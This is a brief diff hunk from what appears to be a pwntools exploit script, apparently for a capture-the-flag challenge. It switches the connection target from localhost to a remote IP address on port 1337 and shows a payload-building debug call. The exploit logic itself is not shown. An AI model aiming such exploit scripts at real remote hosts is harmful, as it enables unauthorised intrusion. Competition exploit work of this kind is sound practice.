@@ -184,8 +184,8 @@ if 0:
     hexdump.hexdump(get_payload(0x1234567812345678,0x1111111,0x60313d9f))
     raise
 
-r = remote("localhost",1337)
-#r = remote("62.210.125.243",1337)
+#r = remote("localhost",1337)
+r = remote("62.210.125.243",1337)
 r.recvuntil("STIC")
 ts = get_ts()
 
